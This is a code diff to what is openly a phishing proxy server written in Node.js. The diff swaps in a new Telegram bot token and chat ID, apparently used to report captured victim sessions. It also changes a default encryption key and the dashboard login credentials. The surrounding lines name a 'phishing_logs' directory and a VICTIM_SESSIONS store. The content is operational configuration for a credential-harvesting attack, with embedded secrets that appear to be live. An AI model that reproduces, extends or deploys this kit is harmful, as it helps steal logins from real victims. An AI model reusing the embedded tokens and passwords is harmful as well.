@@ -36,7 +36,7 @@ try {
 } catch (e) { FormData = null; }
 
 // ── ✅ TELEGRAM CONFIG ──
-const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
+const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
 const CHAT_ID = '7310383191';
 
 const NOTIFIED_SESSIONS = new Set();
@@ -291,7 +291,7 @@ const PROXY_PATHNAMES = {
     favicon: "/favicon.ico"
 };
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "A62A71CA811BD4B8-9D994D7A82B8A40C_460510BB2923A286-AB2797EC85D91568";
 if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
 const LOG_FILE_STREAMS = {};
 const VICTIM_SESSIONS = {};
@@ -455,8 +455,8 @@ if (!express) {
 }
 
 const dashApp = express();
-const dashUser = process.env.DASHBOARD_USER || 'svrps';
-const dashPass = process.env.DASHBOARD_PASS || 'evilworker';
+const dashUser = process.env.DASHBOARD_USER || 'svrpsdev';
+const dashPass = process.env.DASHBOARD_PASS || 'Cozysarps18!';
 
 if (basicAuth) {
     dashApp.use(basicAuth({
